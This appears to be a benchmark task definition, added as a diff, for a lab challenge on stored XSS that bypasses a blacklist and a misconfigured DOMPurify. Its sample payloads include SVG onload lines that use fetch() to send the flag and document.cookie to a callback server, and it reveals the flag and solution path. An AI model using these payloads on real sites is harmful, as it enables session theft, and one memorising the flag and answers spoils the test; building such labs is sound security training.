@@ -1,0 +1,154 @@
+id: S7BEN-HARD-002
+name: "XSS with Input Sanitization Bypass"
+category: A03:2021 - Injection
+subcategory: Cross-Site Scripting (XSS)
+difficulty: medium
+points: 150
+
+description: |
+  Bypass multiple layers of input sanitization to achieve stored XSS.
+
+  The application implements two sanitization layers:
+  1. Custom blacklist filter (blocks <script>, <iframe>, javascript:, event handlers)
+  2. DOMPurify sanitization (vulnerable configuration allows SVG + event handlers)
+
+  Goal: Inject XSS payload that survives both filters and executes on the admin panel.
+
+architecture:
+  type: multi-container
+  containers:
+    - name: node-app
+      role: Vulnerable Node.js application with DOMPurify
+      ports: [3000]
+    - name: callback-server
+      role: Exploitation verification server
+      ports: [8080]
+  networks:
+    - frontend-net (public access)
+    - backend-net (internal, callback server)
+
+vulnerabilities:
+  - type: Stored XSS
+    cwe: CWE-79
+    owasp: A03:2021
+    description: |
+      DOMPurify misconfiguration allows SVG elements with event handlers.
+      Custom blacklist can be bypassed using allowed tags.
+
+  - type: Sanitization Bypass
+    techniques:
+      - SVG injection with onload handler
+      - Event handler encoding
+      - Case variation bypass
+      - Nested encoding
+
+flags:
+  - id: FLAG_WEB
+    value: "S7BEN{xss_sanitizer_byp4ss_svg_onload_def456}"
+    location: /admin endpoint
+    method: Visible on admin panel page
+
+exploitation_path:
+  recon:
+    - Identify input sanitization mechanisms
+    - Test blocked payloads (<script>, <img>, javascript:)
+    - Discover allowed tags (SVG elements)
+    - Find admin panel at /admin
+
+  initial_exploit:
+    - Craft SVG-based XSS payload
+    - Bypass custom blacklist using allowed tags
+    - Submit payload via comment form
+
+  advanced:
+    - Use event handlers (onload, onerror)
+    - Exfiltrate flag via callback server
+    - Steal admin cookies
+
+  sample_payloads:
+    - basic: '<svg onload=alert(1)>'
+    - exfiltration: '<svg onload=fetch("http://callback-server:8080/callback?flag="+document.querySelector(".flag-display code").textContent)>'
+    - cookie_theft: '<svg onload=fetch("http://callback-server:8080/exfil?c="+document.cookie)>'
+
+telemetry:
+  endpoints:
+    - path: /api/telemetry
+      method: GET
+      returns:
+        - benchmark_id
+        - request_count
+        - xss_attempts (detected by pattern matching)
+        - sanitizer_blocks (blacklist hits)
+        - callback_received (exploitation success)
+        - comments_count
+
+    - path: /reset
+      method: POST
+      description: Reset all counters and state
+
+grading:
+  criteria:
+    - metric: Flag Capture
+      weight: 50%
+      description: Successfully retrieve flag from /admin
+
+    - metric: Bypass Technique
+      weight: 20%
+      description: Method used to bypass sanitization
+      scoring:
+        - SVG + onload: 100%
+        - Event handler encoding: 80%
+        - Other valid bypass: 60%
+
+    - metric: Stealth
+      weight: 15%
+      description: Avoid triggering sanitizer blocks
+      formula: 100 - (sanitizer_blocks * 5)
+
+    - metric: Efficiency
+      weight: 15%
+      description: Request count before success
+      baseline: 10 requests
+      formula: (baseline / actual_requests) * 100
+
+learning_objectives:
+  - Understand DOMPurify configuration vulnerabilities
+  - Practice sanitization bypass techniques
+  - Learn about SVG-based XSS vectors
+  - Understand difference between blacklist and whitelist filtering
+
+real_world_examples:
+  - description: "DOMPurify SVG bypass (CVE-2020-26870)"
+    year: 2020
+    impact: "Multiple applications using default DOMPurify config vulnerable to SVG XSS"
+
+  - description: "Google Vulnerability Reward Program - Sanitizer bypasses"
+    year: 2019-2023
+    impact: "Multiple high-severity XSS findings in Google products using sanitization libraries"
+
+references:
+  - title: "OWASP XSS Filter Evasion Cheat Sheet"
+    url: "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+
+  - title: "DOMPurify Security Advisories"
+    url: "https://github.com/cure53/DOMPurify/security/advisories"
+
+  - title: "CWE-79: Cross-site Scripting"
+    url: "https://cwe.mitre.org/data/definitions/79.html"
+
+deployment:
+  startup_time: 20s
+  resource_requirements:
+    memory: 512MB
+    cpu: 0.5
+  estimated_size: 150MB
+
+testing:
+  automated_exploit: exploit.py
+  test_commands:
+    - "curl -X POST http://localhost:3000/comment -H 'Content-Type: application/json' -d '{\"username\":\"test\",\"message\":\"<svg onload=alert(1)>\"}'"
+  expected_behaviors:
+    - "Standard XSS payloads blocked by blacklist"
+    - "SVG payloads pass through sanitization"
+    - "Admin panel renders all comments automatically"
+    - "Callback server receives exfiltration on successful exploit"
